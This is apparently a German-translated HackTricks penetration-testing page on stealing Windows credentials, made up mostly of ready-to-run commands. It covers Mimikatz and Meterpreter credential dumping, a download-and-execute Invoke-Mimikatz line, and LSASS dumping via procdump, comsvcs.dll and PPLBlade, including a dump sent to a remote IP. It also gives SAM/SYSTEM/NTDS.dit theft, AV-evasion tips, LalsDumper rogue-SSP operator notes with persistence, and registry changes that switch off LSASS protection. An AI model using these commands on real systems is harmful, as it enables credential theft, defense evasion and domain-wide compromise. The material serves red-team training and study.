# Stealing Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Finde weitere Dinge, die Mimikatz in** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Erfahre hier mehr über einige mögliche credentials-Schutzmaßnahmen.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige credentials extrahiert.**

## Credentials mit Meterpreter

Verwende das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **das** ich erstellt habe, um **nach passwords und hashes** innerhalb des victim zu suchen.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Sie können dieses Tool verwenden, um **den lsass-Prozess zu dumpen**, **den Dump herunterzuladen** und **die credentials lokal** aus dem Dump **zu extrahieren**.

Sie können auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Vorgang wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24` ausgeführt.

**Hinweis**: Manche **AV** können **detect** als **bösartig** die Verwendung von **procdump.exe to dump lsass.exe** erkennen, da sie die Zeichenkette **"procdump.exe" and "lsass.exe"** **detecting**. Daher ist es **unauffälliger**, als **Argument** die **PID** von lsass.exe an procdump **instead of** den **Namen lsass.exe** zu übergeben.

### Dumping lsass with **comsvcs.dll**

Eine DLL namens **comsvcs.dll** in `C:\Windows\System32` ist dafür verantwortlich, bei einem Absturz **dumping process memory** durchzuführen. Diese DLL enthält eine **function** namens **`MiniDumpW`**, die mittels `rundll32.exe` aufgerufen werden kann.\
Die ersten beiden Argumente sind irrelevant, das dritte ist jedoch in drei Komponenten unterteilt. Die zu dumpende Prozess-ID bildet die erste Komponente, der Speicherort der Dump-Datei die zweite, und die dritte Komponente ist strikt das Wort **full**. Es gibt keine Alternativen.\
Nach dem Parsen dieser drei Komponenten erstellt die DLL die Dump-Datei und überträgt den Speicher des angegebenen Prozesses in diese Datei.\
Die Nutzung der **comsvcs.dll** ist geeignet, um den lsass-Prozess zu dumpen, wodurch das Hochladen und Ausführen von procdump entfällt. Diese Methode wird detailliert beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **Dumping lsass with Task Manager**

1. Klicken Sie mit der rechten Maustaste auf die Task Bar und klicken Sie auf Task Manager
2. Klicken Sie auf More details
3. Suchen Sie im Processes-Tab nach dem Prozess "Local Security Authority Process"
4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und klicken Sie auf "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist ein von Microsoft signiertes Binary, das Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Protected Process Dumper Tool, das das Obfuskieren von memory dumps unterstützt und deren Übertragung auf entfernte Workstations ermöglicht, ohne sie auf die Festplatte zu schreiben.

**Hauptfunktionen**:

1. Umgehung des PPL-Schutzes
2. Obfuskieren von memory dump-Dateien, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Hochladen von memory dumps mittels RAW- und SMB-Methoden, ohne sie auf die Festplatte zu schreiben (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon liefert einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft, weshalb EDR-Hooks für diese API nicht ausgelöst werden:

1. **Stage 1 loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter aus 32 Kleinbuchstaben `d`, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die bösartige DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 inside LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XORt jedes Byte mit `0x20` und mappt das decodierte Blob in den Speicher, bevor die Ausführung übergeben wird.
3. **Stage 3 dumper** – der gemappte Payload implementiert die MiniDump-Logik neu und verwendet dafür **direct syscalls**, die aus gehash-ten API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, streamt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, sodass Exfiltration später möglich ist.

Hinweise für Operatoren:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 schreibt den fest kodierten Platzhalter mit dem absoluten Pfad zu `rtu.txt` um; das Aufteilen der Dateien unterbricht die Kette.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst setzen, damit LSASS das SSP bei jedem Boot neu lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Lokal dekomprimieren und dann an Mimikatz/Volatility zur Extraktion von Credentials übergeben.
* Zum Ausführen von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist; sobald der Aufruf zurückkehrt, lädt LSASS das Rogue-SSP transparent und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte entlädt sie nicht aus LSASS. Entweder den Registry-Eintrag löschen und LSASS neu starten (Reboot) oder sie für langfristige Persistenz liegen lassen.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Geheimnisse auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### NTDS.dit vom Ziel-DC auslesen
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump der NTDS.dit Passwortverlauf vom Ziel-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Zeige das pwdLastSet-Attribut für jedes Konto in NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM stehlen

Diese Dateien sollten **im Verzeichnis** _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ liegen. Aber **man kann sie nicht auf normale Weise einfach kopieren**, da sie geschützt sind.

### Aus der Registry

Der einfachste Weg, diese Dateien zu stehlen, ist, eine Kopie aus der Registry zu erhalten:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Sie können mit diesem Service Kopien geschützter Dateien erstellen. Sie müssen Administrator sein.

#### Mit vssadmin

Die vssadmin-Binärdatei ist nur in Windows Server-Versionen verfügbar
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber du kannst dasselbe auch mit **Powershell** machen. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (das verwendete Laufwerk ist "C:" und sie wird nach C:\users\Public gespeichert), aber du kannst dies zum Kopieren jeder geschützten Datei verwenden:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Schließlich können Sie auch das [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Anmeldeinformationen - NTDS.dit**

Die **NTDS.dit** Datei gilt als das Herz von **Active Directory** und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **password hashes** für Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

Innerhalb dieser Datenbank werden drei Haupttabellen verwaltet:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Link Table**: Sie verfolgt Beziehungen, z. B. Gruppenmitgliedschaften.
- **SD Table**: Hier werden die **Security descriptors** für jedes Objekt gehalten und sorgen für die Sicherheit und Zugriffskontrolle der gespeicherten Objekte.

Mehr Informationen dazu: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ genutzt. Dann könnte ein **Teil** der **NTDS.dit**-Datei **im `lsass`-Speicher** liegen (man kann dort wahrscheinlich die zuletzt verwendeten Daten finden, da zur Leistungsverbesserung ein **Cache** verwendet wird).

#### Entschlüsseln der hashes in NTDS.dit

Der Hash ist dreifach verschlüsselt:

1. Entschlüssele den Password Encryption Key (**PEK**) mit dem **BOOTKEY** und **RC4**.
2. Entschlüssele den **hash** mit **PEK** und **RC4**.
3. Entschlüssele den **hash** mit **DES**.

**PEK** hat den **gleichen Wert** auf **jedem Domain Controller**, wird jedoch innerhalb der **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM-Datei des Domain Controllers (ist zwischen Domain Controllern unterschiedlich)** verschlüsselt. Deshalb benötigt man zum Extrahieren der Anmeldeinformationen aus der NTDS.dit-Datei **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopieren von NTDS.dit mit Ntdsutil

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Du kannst auch den [**volume shadow copy**](#stealing-sam-and-system)-Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denk daran, dass du außerdem eine Kopie der **SYSTEM Datei** benötigst (erneut, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) Trick).

### **Extrahieren von Hashes aus NTDS.dit**

Sobald du die Dateien **erhalten** die **NTDS.dit** und **SYSTEM** erhalten hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Du kannst sie auch **automatisch extrahieren**, indem du einen gültigen domain admin user verwendest:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Alternativ können Sie auch das **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden

### **Extrahieren von Domain-Objekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur secrets extrahiert, sondern auch die gesamten Objekte und deren Attribute, um weitere Informationen zu gewinnen, sobald die rohe NTDS.dit-Datei bereits erlangt wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Secrets (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Zusammen mit anderen Informationen werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC flags, Zeitstempel für letzten Logon und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organizational units tree und Mitgliedschaften, trusted domains mit trusts type, direction und attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Du kannst dieses Binary verwenden, um credentials aus verschiedenen Softwareprogrammen zu extrahieren.
```
lazagne.exe all
```
## Weitere Tools zum Extrahieren von credentials aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann verwendet werden, um credentials aus dem Speicher zu extrahieren. Herunterladen von: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahiert credentials aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Anmeldeinformationen aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **einfach ausführen** und die Passwörter werden extrahiert.

## Ausnutzen inaktiver RDP-Sitzungen und Abschwächung von Sicherheitskontrollen

Ink Dragon’s FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:

### DumpRDPHistory-ähnliche Telemetrie-Erfassung

* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (erfolgreiche Anmeldung) and **25** (Trennung) to map who administered the box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Once you know which Domain Admin regularly connects, dump LSASS (with LalsDumper/Mimikatz) while their **getrennte** session still exists. CredSSP + NTLM fallback leaves their verifier and tokens in LSASS, which can then be replayed over SMB/WinRM to grab `NTDS.dit` or stage Persistence on Domain-Controllern.

### Registry-Downgrades, die FinalDraft anvisiert
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Das Setzen von `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von credentials/tickets während RDP und ermöglicht pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` deaktiviert UAC token filtering, sodass lokale Admins über das Netzwerk uneingeschränkte tokens erhalten.
* `DSRMAdminLogonBehavior=2` erlaubt dem DSRM-Administrator die Anmeldung, während der DC online ist, und verschafft Angreifern ein weiteres integriertes hochprivilegiertes Konto.
* `RunAsPPL=0` entfernt LSASS PPL-Schutzmechanismen, wodurch der Speicherzugriff für Dumping-Tools wie LalsDumper trivial wird.

## Referenzen

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
